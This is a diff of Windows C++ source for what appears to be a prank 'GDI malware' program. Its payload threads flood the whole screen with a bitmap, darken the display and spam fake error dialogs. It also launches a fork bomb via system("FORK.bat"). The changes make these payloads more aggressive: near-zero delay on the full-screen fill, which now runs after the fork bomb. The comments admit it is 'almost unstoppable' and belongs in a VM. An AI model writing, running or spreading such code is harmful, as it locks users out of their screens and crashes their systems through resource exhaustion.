@@ -267,10 +267,6 @@ void WINAPI ded(LPVOID lpVoid) {
 void WINAPI REALded(LPVOID lpVoid) {
     // consider it as an ded v2
 
-    // basically fill the screen every 0 ms
-    // deadly, almost (visually) unstoppable
-
-    // this is why you always showld use an an VM ;)
     HBRUSH brush = CreatePatternBrush((HBITMAP)LoadImage(NULL, L"finale.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE));
 
     HANDLE thread;
@@ -279,15 +275,13 @@ void WINAPI REALded(LPVOID lpVoid) {
     RECT rect;
     HDC hdc = GetDC(0);
 
-    double bosta = 1.1;
     while (true) {
         GetWindowRect(GetDesktopWindow(), &rect);
         FillRect(hdc, &rect, brush);
         DeleteObject(brush);
         ReleaseDC(GetDesktopWindow(), hdc);
-        Sleep(4000/bosta);
+        Sleep(1);
 
-        bosta *= 1.01;
     }
 }
 
@@ -489,7 +483,7 @@ DWORD WINAPI Dark(LPVOID lpstart) {
 	HDC hdc = GetDC(0);
 
 	while (true) {
-		for (int ys = 0; ys < y; ys += 6) {
+		for (int ys = 0; ys < y; ys += 12) {
 			StretchBlt(hdc, 0, 0, x, ys, hdc, 0, 0, 1, 1, SRCAND);
 
 			/*if (rand() % 5 == 0) { DrawIcon(hdc, x, y, LoadIcon(0, IDI_ERROR)); Sleep(0.99); }
@@ -2182,7 +2176,7 @@ void startPayloads() {
     mciSendString(L"play start.mp3", NULL, 0, NULL);
     //Sleep(random() % 3000 + 2400);
 	thread = CreateThread(0, 0, FakeError, 0, 0, &ID);
-	
+
     Sleep(random() % 500 + 340);
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
     // thanks tabnine
@@ -2326,16 +2320,17 @@ void startPayloads() {
 
 	Sleep(random() % 4000 + 3000);
 
-    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)REALded, 0, 0, &ID);
+    
     thread = CreateThread(0, 0, FakeErrorSpam, 0, 0, &ID);
-    RipBozo();
+    
     Sleep(random() % 4000 + 3000);
 
     // Here is when stuff gets a lil' bit stronger:
     Reset(); // stop bytebeat/""malware" music"
+    RipBozo();
     mciSendString(L"play finale.mp3", NULL, 0, NULL);
     system("FORK.bat"); // (forkbomb, %0|%0)
-    
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)REALded, 0, 0, &ID);
     
 	//startPayloads();
 }
